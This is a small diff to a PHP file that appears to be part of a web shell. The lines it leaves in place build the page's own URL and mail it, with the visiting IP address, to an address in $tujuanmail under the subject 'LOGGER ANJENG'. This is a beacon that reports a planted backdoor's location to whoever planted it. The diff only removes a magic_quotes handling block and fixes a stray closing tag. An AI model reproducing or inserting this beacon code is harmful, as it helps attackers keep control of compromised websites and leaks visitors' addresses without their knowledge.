@@ -10,12 +10,8 @@ $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "LOGGER ANJENG", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
  
-if(get_magic_quotes_gpc()){
-foreach($_POST as $key=>$value){
-$_POST[$key] = stripslashes($value);
-}
-}
-?>>
+
+?>
     
 <?php
 $web = $_SERVER["HTTP_HOST"];
